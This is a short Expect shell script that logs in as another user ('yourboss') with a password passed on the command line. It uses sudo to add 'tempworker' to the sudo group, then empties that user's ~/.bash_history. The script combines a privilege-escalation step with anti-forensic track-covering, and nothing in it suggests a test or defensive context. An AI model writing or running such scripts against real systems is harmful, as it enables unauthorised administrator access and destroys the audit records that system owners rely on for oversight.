#!/usr/bin/expect -f
set timeout -1
set password [lindex $argv 0]
spawn su yourboss
expect "Password:"
send "$password\r"
expect "$ "
send "sudo usermod -aG sudo tempworker\r"
expect "yourboss: "
send "$password\r"
expect "$ "
send "cat /dev/null > ~/.bash_history\r"
expect "$ "
send "exit\r"
